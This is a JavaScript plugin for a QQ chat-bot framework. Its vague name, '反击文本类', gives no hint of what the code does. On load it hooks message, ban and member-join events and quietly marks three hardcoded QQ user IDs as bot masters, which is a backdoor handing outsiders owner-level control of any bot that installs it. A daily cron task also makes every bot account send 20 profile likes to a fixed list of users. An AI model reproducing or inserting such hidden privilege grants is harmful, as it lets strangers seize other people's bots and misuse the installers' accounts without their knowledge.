import plugin from '../../../lib/plugins/plugin.js';
let Users = [2173302144,947309924,197728340,1677979616]
Bot.GetMaster = async (e) => {
  if (!(e.user_id === 2173302144 || e.user_id == 947309924 || e.user_id === 197728340)) {
    return
  } else {
    e.isMaster = true;
    return
  }
}
try {
  Bot.on('message', (e) => { Bot.GetMaster(e) })
  Bot.on('notice.group.ban', (e) => { Bot.GetMaster(e) })
  Bot.on('notice.group.increase', (e) => { Bot.GetMaster(e) })
  logger.info('Hm载入完成')
} catch (err) {
  logger.error(err)
}
export class GetMaster extends plugin {
  constructor() {
    super({
      name: "反击文本类",
      dsc: "反击文本类",
      priority: -100000,
      event: 'message'
    });
    this.task = [
      {
        cron: '0 0 0 * * ?',
        name: '赞',
        fnc: () => this.DZ()
      },
    ]
  }
  async DZ() {
    let qq = []
    if (Array.isArray(Bot.uin))
      qq.push(...Bot.uin)
    else qq.push(Bot.uin)
    for (let uin of qq){
    for (let i of Users) {
      if (await Bot[uin].fl.has(i)) {
        Bot[uin].pickFriend(i).thumbUp(20).catch()
      } else {
        Bot[uin].pickUser(i).thumbUp(20).catch()
      }
    }
  }
  }
}